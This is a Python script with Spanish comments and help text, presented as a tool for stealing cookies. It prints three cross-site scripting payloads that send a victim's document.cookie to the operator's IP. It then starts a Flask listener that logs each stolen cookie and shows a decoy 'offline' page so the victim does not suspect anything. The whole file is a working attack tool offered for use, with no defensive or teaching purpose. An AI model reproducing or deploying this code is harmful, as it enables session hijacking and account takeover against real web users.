from flask import Flask,request  #pip3 install flask || python3 -m pip install flask
from colorama import init, Fore, Style
import requests, sys, argparse
from time import sleep
class Hijacking:
		payloads = ["""<script>document.location='http://localhost/cookie?c='+document.cookie</script>""",
		"""<script>new Image().src="http://localhost/cookie?c="+document.cookie;</script>""","""<img src=x onerror=this.src='http://localhost/cookie?c='+document.cookie>"""]
		app = Flask(__name__)
		def main(self):
			parser = argparse.ArgumentParser(description='[?] Este script esta diseñado para facilitar el robo de cookies')
			parser.add_argument('--ip', type=str,dest='Ip',help='[Requerido] Especifica tu ip!',required=True)
			parser.add_argument('--port', type=int,dest='Port',help='[Opcional] Especifica un puerto!, Default=80',required=False,default=80)
			args = parser.parse_args()
			init()
			try:
				port = ':' + str(args.Port)
			except:
				port = ''
			print(Style.BRIGHT  + Fore.GREEN + '\n\t\t\t[*] ' + Fore.CYAN + "Copia el payload que quieras!\n")
			sleep(0.7)
			print(str('\n'.join([str(Style.BRIGHT + Fore.GREEN + "[+] " + Fore.YELLOW + "Payload " + str(k) + ' ' +Fore.WHITE) + str(g) for k,g in enumerate(self.payloads)]).replace('localhost',args.Ip + port)))
			sleep(1)
			print("\t\n\t\t       " + Fore.GREEN + "[*] " + Fore.CYAN + "Iniciando servidor web en {}{}\n\n\n".format(args.Ip,port))
			sleep(1)
			@self.app.route('/cookie')
			def _():
				cookie = request.args.get('c')
				print(Style.BRIGHT + Fore.RED + "\n\n[!]" + Fore.YELLOW +  " Cookie: " + Fore.WHITE + cookie + "\n\n")
				return '<h1>Pagina Offline</h1>' #Pa que no sospeche :p
			self.app.run(args.Ip, port.replace(':',''))

a = Hijacking()
a.main()
